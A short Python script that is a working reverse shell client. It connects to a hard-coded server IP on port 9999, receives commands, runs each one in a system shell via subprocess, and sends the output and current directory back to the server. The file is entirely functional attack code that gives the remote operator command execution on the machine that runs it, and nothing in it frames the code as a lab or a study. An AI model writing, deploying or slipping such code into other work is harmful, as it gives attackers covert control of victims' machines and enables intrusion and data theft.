import os
import socket
import subprocess


s = socket.socket()
host = '192.168.0.102' # Server  ip
port = 9999

s.connect((host,port))


while True:
	data = s.recv(1024)
	if data[:2].decode("utf-8") == "cd": # if first 2 chars of command = cd as it does not return anything
		os.chdir(data[3:].decode("utf-8"))

	if len(data) > 0:
		cmd = subprocess.Popen(data[:].decode("utf-8"), shell= True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE) # Run Command in the terminal
		# only : no number means whole command 
		output_bytes = cmd.stdout.read() + cmd.stderr.read()
		output_str = str(output_bytes, "utf-8")
		# prints out the prompt
		s.send(str.encode(output_str + str(os.getcwd()) + "> "))
		print(output_str) # Results on the clients machine

# Close Connection
s.close()


